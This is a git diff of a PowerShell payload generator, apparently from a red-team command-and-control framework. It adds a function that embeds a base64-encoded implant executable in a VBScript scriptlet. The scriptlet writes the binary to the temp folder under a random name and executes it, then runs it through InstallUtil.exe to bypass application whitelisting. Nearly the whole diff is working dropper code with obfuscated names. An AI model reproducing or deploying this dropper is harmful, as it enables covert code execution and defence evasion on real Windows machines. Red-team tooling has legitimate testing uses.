@@ -107,6 +107,63 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe","'+$paylo
     Write-Host -Object "CS_SCT Payload written to: $global:newdir\payloads\cs_sct.xml"  -ForegroundColor Green
 }
 
+# random
+function Get-RandomString 
+{
+    param (
+        [int]$Length
+    )
+    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
+    $result = ''
+    for ($x = 0; $x -lt $Length; $x++) 
+    {$result += $set | Get-Random}
+    return $result
+}
+
+# create sct dropper payloads
+function df_sct 
+{
+$payloadraw = [Convert]::ToBase64String((Get-Content "$global:newdir\payloads\posh.exe" -encoding byte))
+$payload = $payloadraw -replace "`n", ""
+$payloadbits = $null
+$ranstring = Get-RandomString 10
+$length = $payload.length
+ 
+$vbs = '<sCrIptlEt>
+<ScRIpt language="VBSCRIPT">
+'+$ranstring+' = "'+$payload+'"
+
+Dim fso
+Dim fdsafdsa
+Dim oNode, fdsaa
+Const adTypeBinary = 1
+Const adSaveCreateOverWrite = 2
+
+Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
+oNode.dataType = "bin.base64"
+oNode.Text = '+$ranstring+'
+Set fdsaa = CreateObject("ADODB.Stream")
+fdsaa.Type = adTypeBinary
+tempdir = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
+LocalFile = tempdir & "\'+$ranstring+'.exe"
+fdsaa.Open
+fdsaa.Write oNode.nodeTypedValue
+fdsaa.SaveToFile LocalFile, adSaveCreateOverWrite
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set fdsafdsa = CreateObject("WScript.Shell")
+If (fso.FileExists(LocalFile)) Then
+    fdsafdsa.Exec (LocalFile)
+End If
+LocalFileNew = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"
+If (fso.FileExists(LocalFileNew)) Then
+    fdsafdsa.Exec ("C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U " & LocalFile)
+End If
+</ScRIpt></sCrIptlEt>
+'
+    [IO.File]::WriteAllLines("$global:newdir\payloads\df_sct.xml", $vbs)
+    Write-Host -Object "DF_SCT Payload written to: $global:newdir\payloads\df_sct.xml"  -ForegroundColor Green
+}
+
 # create exe 
 function CreateStandAloneExe($Proxy, $DaisyName) 
 {
